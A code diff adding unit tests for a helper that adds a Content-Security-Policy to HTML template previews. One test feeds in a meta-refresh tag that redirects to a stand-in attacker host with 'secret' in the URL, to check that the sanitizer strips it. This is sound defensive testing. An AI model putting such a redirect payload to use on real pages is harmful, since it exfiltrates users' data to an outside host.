@@ -5,6 +5,8 @@ import { describe, it, expect } from 'vitest';
 import {
     extractKeys,
     inferType,
+    withPreviewCsp,
+    PREVIEW_CSP,
     labelFor,
     formatValue,
     escapeHtml,
@@ -135,5 +137,30 @@ describe('renderTemplate', () => {
         expect(renderTemplate('{{lease_date}}', { lease_date: '2026-01-05' }, {})).toBe(
             new Date(2026, 0, 5).toLocaleDateString()
         );
+    });
+});
+
+describe('withPreviewCsp', () => {
+    const META = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;
+
+    it('blocks every remote load: default-src none, inline styles and data: images only', () => {
+        expect(PREVIEW_CSP).toBe("default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:");
+    });
+
+    it('inserts the policy right after <head>, keeping a leading doctype first (standards mode)', () => {
+        const out = withPreviewCsp('<!DOCTYPE html><html><head lang="en"><style>b{}</style></head><body></body></html>');
+        expect(out.startsWith('<!DOCTYPE html><html><head lang="en">' + META + '<style>')).toBe(true);
+    });
+
+    it('does not mistake <header> for <head>; with no head the policy comes first', () => {
+        const out = withPreviewCsp('<header>Top</header><p>x</p>');
+        expect(out).toBe(META + '<header>Top</header><p>x</p>');
+    });
+
+    it('strips meta refresh (CSP cannot stop the frame navigating out with values in the URL)', () => {
+        const out = withPreviewCsp('<head><META HTTP-EQUIV="Refresh" content="0;url=https://evil.example/?x=secret"></head><p>ok</p>');
+        expect(out).not.toMatch(/refresh/i);
+        expect(out).not.toContain('evil.example');
+        expect(out).toContain('<p>ok</p>');
     });
 });
